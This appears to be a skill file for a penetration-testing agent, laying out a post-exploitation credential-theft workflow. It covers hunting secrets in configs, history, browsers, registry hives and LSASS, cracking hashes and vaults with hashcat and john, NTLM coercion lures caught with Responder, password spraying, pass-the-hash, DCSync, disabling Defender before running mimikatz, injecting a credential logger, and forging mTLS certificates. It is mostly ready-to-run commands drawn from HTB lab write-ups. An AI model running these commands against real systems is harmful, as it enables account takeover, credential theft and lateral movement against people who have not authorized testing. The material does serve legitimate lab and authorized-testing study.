---
name: Credential Access and Cracking
description: Find, extract, and crack credentials post-exploitation — hash identification, hashcat/john mode+wordlist+rule selection, cred hunting in configs/history/browsers/memory/vaults, and cracking KeePass/ZIP/SSH-key/office hashes, then spray and reuse the plaintext.
tags: [credential-access, cracking, hashcat, john, hashes, password-spray, credential-reuse, keepass, post-exploitation]
recommended_tools: [hashcat, john, netexec, hydra, ssh, python3, secretsdump]
vuln_classes: [credential_exposure]
domain: post-exploitation
phase: exploitation
---

# Credential Access and Cracking

Once you have any foothold (shell, file read, DB dump, captured hash), the job is: locate secret
material, identify what it is, crack it offline if hashed, then reuse the plaintext for lateral
movement and privilege escalation. Maps to `credential_exposure` (CWE-522/256/257/798/916).

Golden rules:
- **Always crack offline.** Never burn account-lockout budget online when you hold the hash.
- **Identify before cracking.** Wrong `-m`/`--format` = zero cracks. Confirm the hash type first.
- **Reuse relentlessly.** One cracked password is a spray candidate against every user and service.
- **Proof = the plaintext authenticates.** A cracked string is only a finding once it logs in.

## Hunt: where credentials live

When you land a shell or file-read, sweep these before anything else.

### Linux
```
/etc/shadow  /etc/passwd                 # unix hashes (need both to unshadow)
~/.bash_history  ~/.zsh_history  ~/.mysql_history  ~/.psql_history  ~/.python_history
~/.ssh/id_* ~/.ssh/config ~/.ssh/authorized_keys ~/.ssh/known_hosts
~/.aws/credentials  ~/.config/  ~/.netrc  ~/.git-credentials  ~/.pgpass
/var/www/**/{wp-config.php,config.php,.env,settings.py,application.properties,web.config}
/opt/**  /srv/**  /home/*/  *.kdbx *.psafe3 *.zip *.7z *.rar *.bak *.old *.sql *.tar.gz
/var/backups/  /tmp/  /dev/shm/          # dropped creds, backups, memory-mapped files
```
```bash
# broad grep for plaintext secrets across a tree
grep -rniE '(pass(word)?|passwd|secret|api[_-]?key|token|credential|BEGIN (RSA|OPENSSH|EC) PRIVATE)' \
  /var/www /opt /home /etc 2>/dev/null | grep -viE 'example|changeme|<|placeholder'
# history + env
grep -riE 'pass|secret|token|-p ' ~/.*history 2>/dev/null ; env | grep -iE 'pass|key|token'
```

### Windows
```
C:\Users\*\.ssh\  \AppData\**\*.kdbx   \AppData\Roaming\Mozilla\Firefox\Profiles\*\logins.json
%APPDATA%\..\Local\Google\Chrome\User Data\Default\Login Data   (SQLite, DPAPI-encrypted)
unattend.xml  sysprep.xml  Autounattend.xml  Groups.xml (GPP)  web.config  *.config
registry: HKLM\SAM  HKLM\SECURITY  HKLM\SYSTEM  ;  cmdkey /list ;  runas /savecred
```
```
# LSASS / SAM / LSA secrets (route to active-directory skill for full DCSync)
reg save HKLM\SAM sam.hive & reg save HKLM\SYSTEM system.hive & reg save HKLM\SECURITY sec.hive
secretsdump.py -sam sam.hive -system system.hive -security sec.hive LOCAL
lazagne.exe all          # browsers, wifi, mail, sysadmin tools, git, DBs in one shot
```
**Proof:** a file/registry read returning a real hash or plaintext (not a placeholder).

## Identify the hash

Never guess the mode. Fingerprint first.
```bash
hashid -m '<HASH>'                       # prints candidate hashcat -m modes
hash-identifier                          # interactive fallback
nth --text '<HASH>'                      # name-that-hash, ranked guesses
```
Quick visual tells:

| Looks like | Type | hashcat `-m` | john `--format` |
|---|---|---|---|
| `user:1001:aad3b435...:<32hex>:::` | NTLM (SAM/NTDS) | 1000 | nt |
| `<user>::<DOMAIN>:<16hex>:<32hex>:<blob>` | NetNTLMv2 (Responder) | 5600 | netntlmv2 |
| `$krb5tgs$23$*user*...` | Kerberoast TGS-REP | 13100 | krb5tgs |
| `$krb5asrep$23$user@DOM:...` | AS-REP roast | 18200 | krb5asrep |
| `$1$` `$5$` `$6$` `$y$` | md5crypt/sha256crypt/sha512crypt/yescrypt | 500/7400/1800/-- | md5crypt/sha256crypt/sha512crypt |
| `$2[aby]$` | bcrypt | 3200 | bcrypt |
| `{SSHA}` / `$argon2id$` | LDAP SSHA / Argon2 | 111 / 34000 | Salted-SHA1 / argon2 |
| `$P$` `$H$` / `$wp$` | phpass (WP/Joomla/Drupal7) | 400 | phpass |
| `$DCC2$` `$MACHINE...` | MS Cache v2 (domain cached) | 2100 | mscash2 |
| `sha1$salt$...` / `pbkdf2_sha256$` | Django | 124 / 10000 | django |
| 32 hex, no salt | raw MD5 (or NTLM) | 0 (or 1000) | raw-md5 |
| 40 hex | raw SHA1 | 100 | raw-sha1 |
| 64 hex | raw SHA256 | 1400 | raw-sha256 |

## Crack: hashcat / john workflow

Escalate: fast wordlist -> wordlist+rules -> targeted mask -> big wordlist. Stop the moment it cracks.
```bash
# 0. straight wordlist (rockyou first, always)
hashcat -m <MODE> -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
# 1. wordlist + best rule set (biggest single ROI step)
hashcat -m <MODE> -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m <MODE> -a 0 hashes.txt rockyou.txt -r rules/OneRuleToRuleThemAll.rule
# 2. mask / brute for structured or short passwords
hashcat -m <MODE> -a 3 hashes.txt '?u?l?l?l?l?l?d?d'        # e.g. Summer21 shape
hashcat -m <MODE> -a 3 hashes.txt '?a?a?a?a?a?a' --increment
# 3. combinator / hybrid (word + appended digits/symbols)
hashcat -m <MODE> -a 6 hashes.txt rockyou.txt '?d?d?d?d'    # word + 4 digits
hashcat -m <MODE> -a 7 hashes.txt '?d?d' rockyou.txt        # digits + word
# show results / resume
hashcat -m <MODE> hashes.txt --show ; hashcat --restore
```
John equivalents:
```bash
john --format=<FMT> --wordlist=rockyou.txt --rules=Jumbo hashes.txt
john --format=<FMT> --mask='?u?l?l?l?l?d?d' hashes.txt
john --show --format=<FMT> hashes.txt        # dump cracked user:pass
```
Wordlist tiers: `rockyou.txt` -> `seclists/Passwords/*` -> `weakpass` / `crackstation` (huge).
Build a target-specific list: `cewl <URL> -m 6 -w custom.txt` (scrape site words), then mutate
with rules. Add company name, seasons, years, product names as base words.

**Proof:** `--show` / `john --show` returns `hash:plaintext`. Confirm by authenticating.

### Unix shadow
```bash
unshadow /etc/passwd /etc/shadow > unshadow.txt
john --wordlist=rockyou.txt unshadow.txt          # auto-detects sha512crypt etc.
hashcat -m 1800 -a 0 hashes.txt rockyou.txt -r best64.rule    # sha512crypt ($6$)
```
sha512crypt/bcrypt/yescrypt are slow — lean on rules + a smart small wordlist, not brute.

### AD hashes (quick reference — deep AD in active-directory skill)
```bash
# NTLM from NTDS/SAM
hashcat -m 1000 -a 0 nt_hashes.txt rockyou.txt -r OneRuleToRuleThemAll.rule
# Kerberoast: crack the SPN service account's plaintext
hashcat -m 13100 -a 0 kerb.txt rockyou.txt -r best64.rule
# AS-REP roast
hashcat -m 18200 -a 0 asrep.txt rockyou.txt -r best64.rule
# NetNTLMv2 captured via Responder/mitm
hashcat -m 5600 -a 0 netntlmv2.txt rockyou.txt -r best64.rule
```
NTLM need not be cracked to be useful — **pass-the-hash** it directly (`netexec smb <IP> -u <USER>
-H <HASH>`). Crack only when you need the plaintext for reuse on non-NTLM services.

## Extract: application databases

Recurs constantly on web foothold. Dump the users table, identify the hash, crack. SQLite/JSON
stores are frequently **plaintext or unsalted MD5** — feed MD5 straight to CrackStation for instant hits.
```bash
sqlite3 <PATH>/{users.db,database.db,instance/*.db} 'select username,password from users;'
mysql   -u <USER> -p'<PASS>' <DB>  -e 'select username,password from users;'
mssqlclient.py <DOMAIN>/<USER>:'<PASS>'@<IP>          # then: select * from users;
```
App-specific reformat before cracking (most crack as `-m 10900` PBKDF2-HMAC-SHA256):
- **Werkzeug/Flask/Django** — `pbkdf2:sha256:600000$...` -> `-m 10900`.
- **Grafana** — `select login,password,salt from user` -> `grafana2hashcat.py` -> `-m 10900`.
- **Gitea** — `select passwd,salt,name from user` -> `xxd -r -p | base64` -> `user:sha256:50000:<b64salt>:<b64digest>`.
- **Mirth** — `PERSON_PASSWORD` base64 -> `sha256:600000:<b64salt>:<b64key>`.
- **Gibbon** — `SHA256($salt.$pass)`, crack `<HASH>:<SALT>` with `-m 1420`.
- **Wing FTP** — `sha256($pass.$salt)`, salt `WingFTP`, `-m 1410`.
- **hMailServer** — Blowfish INI (key `THIS_KEY_IS_NOT_SECRET`), dump `hm_accounts`, `-m 1421`.
- **WordPress** — `wp_users` phpass `$P$` -> `-m 400`.

**Proof:** hash -> plaintext validated by `su`/SSH/SMB login.

## Coerce: force the target to hand you a hash

Drop UNC-referencing lures on a writable share a victim browses, or force a service to auth
outbound, then catch NetNTLMv2 with Responder and crack `-m 5600`.
```bash
sudo responder -I tun0
ntlm_theft.py -g all -s <IP> -f lure         # .scf/.url/.lnk/.library-ms (CVE-2025-24071)/.wax
EXEC xp_dirtree '\\<IP>\share'                                        # MSSQL sink
curl --negotiate -u : "http://<HOST>/File/Download?fileName=//<IP>/x" # app download endpoint
hashcat -m 5600 captured.hash rockyou.txt && netexec smb <IP> -u <USER> -p '<CRACKED>'
```
Cross-session: **RemotePotato0** (`-m 2 -s 1 -x <IP>` + `socat TCP-LISTEN:135,fork TCP:<IP>:9999`)
relays a logged-in user's hash (`qwinsta` to spot active sessions).
**Proof:** Responder logs `NTLMv2-SSP Hash` for `<DOMAIN>\<user>`.

## Tool-stored secrets (recover key on-host, then decrypt)

- **DPAPI** — `dpapi.py masterkey -file <GUID> -sid <SID> -password <PASS>` then `dpapi.py credential -file <BLOB> -key <MK>`.
- **PowerShell SecureString** — `Get-Content x | ConvertTo-SecureString` then `Marshal::PtrToStringAuto(...SecureStringToBSTR($s))` (owning user's context).
- **mRemoteNG** `mremoteng_decrypt.py -rf config.xml` · **Jenkins** `jenkins-credentials-decryptor -m master.key -s hudson.util.Secret -c config.xml` · **Splunk** `splunksecrets ... -S splunk.secret` · **Lansweeper** `LansweeperDecrypt.ps1` (+on-host `Encryption.txt`) · **RoundCube** `bin/decrypt.sh` · **SolarPuTTY** `SolarPuttyCracker.py`.
- **Version-control / backup history** — `git log -p`, `git diff <OLD> <NEW>`, `hg diff -c <REV>`, `diff backup01.sql backup02.sql` recover rotated/removed creds.

**Proof:** plaintext credential for next user recovered; validates over SSH/SMB.

## Crack: files and vaults

Extract a hashcat/john-parseable hash with a `*2john` tool, then crack it.

### KeePass (.kdbx)
```bash
keepass2john Database.kdbx > kp.hash        # strip a "Database:" prefix if the whole line is fed to hashcat
hashcat -m 13400 -a 0 kp.hash rockyou.txt -r best64.rule
john --wordlist=rockyou.txt kp.hash
```
**Proof:** open the DB with the master password (`kpcli` / KeePassXC) — every entry is now readable.
If a **.key/keyfile** protects it, you need that file too; hunt it near the .kdbx.

### ZIP / 7z / RAR / PDF / Office
```bash
zip2john secret.zip > z.hash    ; hashcat -m 13600 z.hash rockyou.txt      # ZIP (PKZIP=17200/17210, AES=13600)
7z2john secret.7z  > z.hash     ; hashcat -m 11600 z.hash rockyou.txt
rar2john secret.rar> z.hash     ; hashcat -m 13000 z.hash rockyou.txt      # RAR5
office2john doc.docx> o.hash    ; hashcat -m 9600 o.hash rockyou.txt       # Office 2013+
pdf2john file.pdf  > p.hash     ; hashcat -m 10500 p.hash rockyou.txt
```
**Proof:** archive/document extracts or opens with the recovered password.

### SSH private key (encrypted id_rsa)
```bash
ssh2john id_rsa > key.hash
hashcat -m 22921 key.hash rockyou.txt      # RSA/DSA/EC ($sshng$...) ; try 22911-22931 per cipher
john --wordlist=rockyou.txt key.hash
chmod 600 id_rsa ; ssh -i id_rsa <USER>@<IP>   # passphrase now known
```
**Proof:** `ssh -i` authenticates (or `ssh-keygen -y -f id_rsa` accepts the passphrase).

### GPG / LUKS / VeraCrypt
```bash
gpg2john secret.gpg > g.hash ; john --wordlist=rockyou.txt g.hash
# LUKS/VeraCrypt: bench modes 14600 / 137xx — slow, use a targeted wordlist only
```

### Browser & DB stores
```bash
firefox_decrypt <profile>                  # Firefox logins.json + key4.db -> plaintext
# Chrome (Windows): DPAPI-decrypt Login Data with the user's key (lazagne/SharpChrome)
# App configs: mysql/postgres/redis/mongo URIs in .env/config often hold live creds -> test directly
```

## Reuse: spray, stuff, pass

Every recovered secret is an input to the next attack. Do this before more cracking.

### Password spray (few passwords, many users)
```bash
netexec smb <IP> -u users.txt -p '<PASS>' --continue-on-success        # AD/SMB
netexec smb <IP> -u users.txt -p 'Season2024!' 'Company123!' Welcome1  # seasonal candidates
netexec ldap <IP> -u users.txt -p '<PASS>' ; netexec winrm <IP> -u users.txt -p '<PASS>'
hydra -L users.txt -p '<PASS>' ssh://<IP>                              # generic services
```
Stay under lockout thresholds: 1–2 attempts per user per window. Prefer spraying ONE password
across all users over many passwords against one account.

### Credential stuffing / reuse
```bash
# a cracked user:pass — replay everywhere the user might exist
netexec smb <IP> -u <USER> -p '<PASS>'      # then ldap, winrm, mssql, ssh, ftp, web login, vpn
```
Users reuse passwords across services and often between personal-vault entries and their AD account.
Root's password frequently matches a service-account or DB password found in a config.

### Pass-the-hash / pass-the-ticket
```bash
netexec smb <IP> -u <USER> -H <HASH> --local-auth        # PtH, no cracking needed
evil-winrm -i <IP> -u <USER> -H <HASH>
```

## Proof / success indicators (per stage)

- **Found:** file/registry/memory read returns a real hash or plaintext credential.
- **Identified:** hashid/nth agrees on a mode and the sample parses cleanly.
- **Cracked:** `hashcat --show` / `john --show` outputs `hash:plaintext` (no placeholder).
- **Reused:** the plaintext/hash authenticates to a live service (`Pwn3d!` / valid login / new shell).

Only report a credential finding once the secret authenticates or unlocks the protected resource —
a raw hash or unvalidated match is at most `info_disclosure`, not confirmed credential compromise.

## Real-world chains (0xdf HTB)

Battle-tested credential-access ladders mined from HTB write-ups. Each is generalized with
`<PLACEHOLDER>` operands and a **PROOF** indicator. Chain them: loot -> identify -> crack -> reuse.

### Mail-client & browser credential stores
```bash
# Thunderbird / Mozilla saved logins (empty or reused master password)
ls /home/<USER>/.thunderbird/*.default/ ; python mozilla2john.py key3.db > m.hash ; john m.hash
firefox_decrypt.py /home/<USER>/.mozilla/firefox/<PROFILE>   # -> plaintext saved logins (e.g. root:<PASS>)
```
**PROOF:** recovered `<USER>:<PASS>` authenticates over SSH/su (Crimestoppers, Chaos).

### Loot creds from web/app source & reuse
```bash
cat /var/www/html/connection.php ; cat /var/lib/tomcat8/db_connect      # DB creds in web config
cat /var/www/mysql_data.conf ; base64 /var/www/html/page.php            # reused OS/su password
mysql -u <USER> -p<PASS> -e 'SELECT * FROM users.accounts;'             # then query users table
su <USER>   # or: ssh <USER>@<IP>                                       # password reuse
```
**PROOF:** DB/config password reused as OS password; `su`/SSH succeeds (Falafel, Stratosphere, FriendZone, CTF, Help).

### Inject a credential logger into a writable app hit by a privileged job
```bash
# append to a login handler the privileged automation POSTs to:
#   fwrite(fopen('/dev/shm/df','a'), print_r($_REQUEST,true));
cat /dev/shm/df    # read captured plaintext once the scheduled login fires
```
**PROOF:** captured Administrator plaintext from the log sink (Aragog).

### Weak / guessed / enumerated web credentials
```bash
# admin user leaked in users.xml/config; password guessable from box/site name (admin:nibbles)
# username enum via password-reset response differences -> valid account
cewl -w wl.txt -e -a http://<DOMAIN>                # site-derived wordlist
hydra -l <USER> -P wl.txt <IP> http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'
hydra -6 -L users.txt -P pass.txt <IPV6> http-form-post '/login.php:user=^USER^&pass=^PASS^:F=incorrect'
curl -s 'http://<IP>/<APP>/api/index.php?action=authenticate' -d 'username=admin&password=<PASS>'
```
**PROOF:** login accepted (Nibbles, Bart harvey:potter, Teacher, Wall, Luke, Centreon admin:password1).
Handle CSRF tokens by parsing the fresh token per request in a Python brute-forcer.

### Decrypt / brute password-protected key & container material
```bash
openssl rsa -in <ENC_KEY> -out key.dec                         # known passphrase -> decrypt RSA key
cat rockyou.txt | while read p; do openssl enc -d -a -AES-256-CBC -in <FILE> -k "$p" \
  >/dev/null 2>&1 && echo "PW: $p" && break; done              # brute OpenSSL symmetric blob
openssl enc -d -aes-256-cbc -k <PASS> -in enc.bin -out out     # reverse app AES-256-CBC scheme
bruteforce-luks -t 10 -f rockyou.txt backup.img ; cryptsetup open --type luks backup.img vol
```
**PROOF:** key/blob decrypts (Valentine hype_key, Hawk 'friends', Chaos, Arkham 'batmanforever').

### Peel layered encodings & nested archives
```bash
v=$(cat pwdbackup.txt); for i in $(seq 1 13); do v=$(echo "$v" | base64 -d); done; echo "$v"  # N-times base64
cat password_backup | xxd -r > pb.bz2 ; bunzip2 pb.bz2 ; gunzip password_backup ; tar xvf *.tar
fcrackzip -u -D -p rockyou.txt out.zip                          # password-protected zip
# esoteric layers (Ook!/BrainFuck -> hex -> base64): decode with dcode.fr / decoders
```
**PROOF:** cleartext password falls out of the final layer (Poison, Curling, Frolic, Bitlab base64->ssh).

### Extract creds from offline data files
```bash
mdb-tables backup.mdb ; mdb-export backup.mdb auth_user        # MS Access .mdb (mdbtools)
readpst 'Access Control.pst'                                   # Outlook PST -> emails w/ creds
olevba '<FILE>.xlsm'                                           # Excel VBA macro -> DB conn string
uncompyle6 /opt/.shelby/backup                                 # decompile Python .pyc -> hardcoded creds
git log -p ; git diff <OLD> <NEW>                              # secrets in commit history
```
**PROOF:** cleartext creds recovered from the artifact (Access, Querier, Wall, Ghoul, Craft, Bitlab).

### Steganography & hidden-file loot
```bash
cat /home/<USER>/Documents/.backup                             # passphrase in hidden dotfile
steghide extract -sf <IMAGE>.jpg -p '<PASS>'                   # steghide-hidden creds behind passphrase
```
**PROOF:** extracted password enables `su` (Irked).

### NTFS Alternate Data Streams (Windows)
```
streams.exe -s -accepteula .        # enumerate ADS names (Sysinternals)
more < <FILE>:<STREAM>              # read content hidden in a stream (e.g. root.txt:kdbx)
```
**PROOF:** flag/DB content read from an otherwise-empty file's stream (Dropzone, BigHead).

### Windows registry & event logs for stored creds
```
reg query HKLM /f password /t REG_SZ /s                        # stored service passwords (decode hex values)
wevtutil /u:<DOM>\<USER> /r:<TARGET> /p:<PASS> /rd:true qe security /f:text > sec.txt  # cleartext in 4688 args
```
**PROOF:** decoded value / logged command-line arg yields next user's password (BigHead, Helpline).

### Windows saved-credential objects
```powershell
$c = Import-CliXml -Path <PATH>\cred.xml ; $c.GetNetworkCredential() | Format-List *   # DPAPI, owner ctx
type 'C:\Users\Administrator\Desktop\Backup Scripts\BackupScript.ps1'                  # hardcoded admin pw
```
**PROOF:** plaintext admin password recovered -> SSH/WinRM (Reel, Helpline admin-pass.xml).

### Memory-dump & LSASS credential extraction
```
volatility kdbgscan -f <DUMP> ; volatility -f <DUMP> --profile <PROF> hashdump -y <REG> -s <REG>
mimikatz # sekurlsa::logonpasswords        # (Set-MpPreference -DisableRealtimeMonitoring $true first)
```
**PROOF:** NTLM hash / cleartext admin password out of memory (Silo dump, Helpline LSASS).

### Network-sniff cleartext auth
```bash
tcpdump -i lo   -nnXs 0 'port 389' & curl http://localhost/status.php   # loopback LDAP bind cleartext
tcpdump -i <IF> -nnXSs 0 'port 21' -w out.pcap                          # redirected/hijacked FTP
aircrack-ng -e <SSID> -w rockyou.txt captured.cap                       # WPA handshake from looted pcap
cat /var/spool/mail/<USER>                                              # FTP/app creds in mail spool
```
**PROOF:** plaintext creds captured from the wire/spool (Lightweight, Carrier, Olympus, Scavenger).

### File-read primitives to steal keys (XXE / traversal / SFTP)
```bash
./xxe_get.py /home/<USER>/.ssh/id_rsa                                   # XXE arbitrary file read
curl -s -X POST -d 'file=....//....//home/<USER>/.ssh/id_key' <URL>/fileRead.php   # path traversal
sftp <USER>@<IP>  # symlink /var/www/html-admin/login.php login ; get login.swp    # weak-chroot escape
```
**PROOF:** private key / source with creds exfiltrated (DevOops, Waldo, OneTwoSeven).

### Crack found encrypted SSH keys (targeted passphrase)
```bash
cewl http://<IP>/secret.php -w site.wl                 # theme the wordlist to the site
ssh2john id_rsa > k.john ; john --wordlist=site.wl k.john ; ssh -i id_rsa <USER>@<IP>
# key passphrase is frequently reused as the account password: su <USER>
```
**PROOF:** passphrase cracked; SSH/su succeeds (Ghoul ILoveTouka, Postman computer2008->su Matt, Chainsaw).

### Recover secrets from a mounted image / offline hives
```bash
mount -t cifs //<IP>/backups /mnt -o user=,password=
guestmount --add /mnt/**/<disk>.vhd --inspector --ro /mnt2/       # mount VHD backup
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL   # dump local NT hashes
```
**PROOF:** offline SAM yields NT hash -> crack `-m 1000` -> login (Bastion L4mpje:bureaulampje).

### App-DB & config credential stores (older stacks)
```bash
find /var -name pgadmin4.db ; sqlite3 <DB> 'select * from server;'   # pgAdmin4 encrypted server pw
python .dbtest.py "SELECT * from user"                               # in-repo DB helper -> dump users
curl http://<USER>:<PASS>@localhost:5984/passwords/_all_docs         # CouchDB secrets DB
curl http://localhost/management/config.json                         # Ajenti root password in config.json
curl -X POST http://<IP>:3000/login -d '{"username":"admin","password":"<PASS>"}'  # get JWT
curl http://<IP>:3000/users/<USER> -H 'Authorization: Bearer <TOKEN>'              # then dump all users
psql -h <IP> -p <PORT> -U <USER> ; UPDATE aaapassword SET password='<bcrypt>' WHERE ...  # reset admin pw
```
**PROOF:** cleartext/reset creds authenticate to the app (Fortune, Craft, Canape, Luke, Helpline SDP).

### Reverse custom crypto in decompiled binaries
```bash
# .NET (dnSpy): 3DES-ECB config crypto, key = MD5 of embedded string
python3 -c "from Crypto.Cipher import DES3;import base64,hashlib as h; \
k=h.md5(b'<KEY>').digest(); print(DES3.new(k,DES3.MODE_ECB).decrypt(base64.b64decode('<BLOB>')))"
```
**PROOF:** recovered stored creds (Json superadmin/funnyhtb). Patch interactive vault checkers
(e.g. recompile to take the password as argv, exit 0 on success) to brute offline in milliseconds (Ethereal pbox).

### Service-specific credential brute / guess
```bash
odat passwordguesser -s <IP> -d <SID>                                     # Oracle default creds (SCOTT:tiger)
for p in $(cat 8char.txt); do echo $p | rsync -a "rsync://<USER>@[<IP>]:<PORT>/<MOD>/" 2>&1 \
  | grep -q 'auth failed' || echo "FOUND $p"; done                        # rsync module password
stoken --token=<SEED> --use-time=<OFFSET> --pin=0000                      # RSA SecurID OTP from leaked seed
```
**PROOF:** valid creds/OTP accepted (Silo Oracle, Zetta rsync, CTF SecurID).

### Legacy/format-specific hash cracking (mode reference)
```bash
hashcat -m 7400  <HASH> rockyou.txt         # salted SHA-512 crypt (unix shadow)  (Sunday)
hashcat -m 10900 <HASH> rockyou.txt         # PBKDF2-HMAC-SHA256                    (Oz)
hashcat -m 0     <HASH> rockyou.txt         # raw MD5 (memcached/CMS dumps)         (Dab, Teacher)
hashcat -m 5600  <HASH> rockyou.txt         # NetNTLMv2 (Responder/coerce)          (Sizzle, Querier, RE, Giddy)
hashcat -m 13100 <HASH> rockyou.txt         # Kerberoast TGS-REP                    (Active)
hashcat -m 18200 <HASH> rockyou.txt         # AS-REP roast                          (Forest s3rvice)
hashcat -m 3200  <HASH> rockyou.txt         # bcrypt (SDP backup)                   (Helpline)
hashcat -m 11600 backup.hash rockyou.txt    # 7z (7z2john)                          (Lightweight 'delete')
hashcat -m 13400 kp.hash rockyou.txt        # KeePass +keyfile (keepass2john -k)    (Safe, BigHead)
# themed subset speeds slow modes: grep -iE 'love|secret|god' rockyou.txt > wl (Ellingson iamgod$08)
# Cisco: john type5 (MD5-crypt); decode type7 XOR (key 'tfd;kfoA,.iyewrkldJKD') (Heist)
```
**PROOF:** `hashcat --show` prints `hash:plaintext`; the plaintext then logs in.

### GPP cpassword (SYSVOL)
```bash
smbclient //<IP>/Replication      # get .../Groups/Groups.xml
gpp-decrypt <CPASSWORD>           # MS14-025 fixed AES key -> plaintext
```
**PROOF:** recovered service-account password (Active SVC_TGS:GPPstillStandingStrong2k18).

### AD hash-based lateral movement (no crack needed)
```bash
smbclient \\\\<IP>\\<SHARE> -U <USER>%<HASH> --pw-nt-hash     # pass-the-hash to a share
wmiexec.py -hashes :<HASH> administrator@<IP>                 # PtH remote exec
crackmapexec smb <IP> -u users.txt -p passwords.txt          # spray then lookupsid.py / rpcclient enum
secretsdump.py <USER>:<PASS>@<IP>                            # DCSync all domain hashes
```
**PROOF:** `whoami` returns the target principal / new shell (Sizzle, Ypuffy, Heist, Forest).

### Forge client certificate from a stolen CA (mTLS bypass)
```bash
# loot CA key+cert (filesystem read, disable_functions bypass via file_get_contents, etc.)
openssl x509 -req -in <CSR> -CA ca.cert.pem -CAkey ca.key.pem -CAcreateserial -out client.pem -days 1024
openssl pkcs12 -export -in client.pem -inkey ca.key -out client.p12    # import into browser / curl --cert
```
**PROOF:** mTLS-protected area loads with the forged cert (LaCasaDePapel, Fortune, Ethereal code-signing CA).

### Recover key material from IPFS / EFS-protected files
```bash
ls ~/.ipfs/blocks/ ; base64 -d bobby.key.enc.b64 > k.enc ; ssh2john k.enc | john --wordlist=rockyou  # IPFS
# EFS: mimikatz crypto::system + dpapi::masterkey /password:<PASS> + dpapi::capi ; openssl pkcs12 ; certutil -importpfx
```
**PROOF:** decrypted SSH key / EFS files read in cleartext (Chainsaw, Helpline EFS).

### Password-pattern inference
```bash
cat /var/lib/postgresql/.psql_history        # scheme like sup3r@<role> -> infer sup3r@root ; su -
```
**PROOF:** inferred password grants root (Zetta). One-char-unknown -> generate candidates + hydra (Teacher).

## Chaining

- Cracked service-account password -> lateral move to its host -> local privesc.
- KeePass/browser vault -> often contains **domain admin**, VPN, cloud, and DB creds in one shot.
- NTLM/NetNTLMv2 -> PtH or relay (route to active-directory / smb-ntlm skills) — crack only if you
  need the cleartext elsewhere.
- Config-file DB URI -> connect to DB -> dump user table hashes -> crack -> app/admin takeover.
- Any cracked password -> feed as a base word into `cewl`+rules for a target-tuned wordlist, and as
  a spray candidate against every enumerated user and service.
